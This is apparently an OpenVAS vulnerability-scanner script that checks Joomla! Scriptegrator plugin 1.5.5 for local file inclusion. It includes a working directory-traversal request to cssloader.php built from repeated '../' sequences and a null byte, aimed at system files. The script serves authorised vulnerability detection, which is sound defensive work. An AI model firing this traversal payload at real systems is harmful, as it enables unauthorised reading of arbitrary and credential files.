###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_scriptegrator_plugin_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla! Scriptegrator plugin Multiple Local File Inclusion Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Joomla! Scriptegrator plugin Version 1.5.5, Other versions may also
  be affected.";
tag_insight = "The flaws are caused by improper validation of user-supplied input via
  the multiple parameter to multiple files, which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 14th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.greatjoomla.com/extensions/plugins/core-design-scriptegrator-plugin.html";
tag_summary = "This host is installed Joomla! with Scriptegrator plugin and is
  prone to multiple local file inclusion vulnerabilities.";

if(description)
{
  script_id(802026);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-17 11:16:31 +0200 (Fri, 17 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla! Scriptegrator plugin Multiple Local File Inclusion Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17394");
  script_xref(name : "URL" , value : "http://www.greatjoomla.com/extensions/plugins/core-design-scriptegrator-plugin.html");

  script_description(desc);
  script_summary("Determine if Joomla! Scriptegrator plugin is prone to LFI");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/plugins/system/cdscriptegrator/libraries/highslide/" +
                  "css/cssloader.php?files[]=", crap(data:"../",length:3*15),
               files[file], "%00.css");
  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    security_hole(port:port);
    exit(0);
  }
}
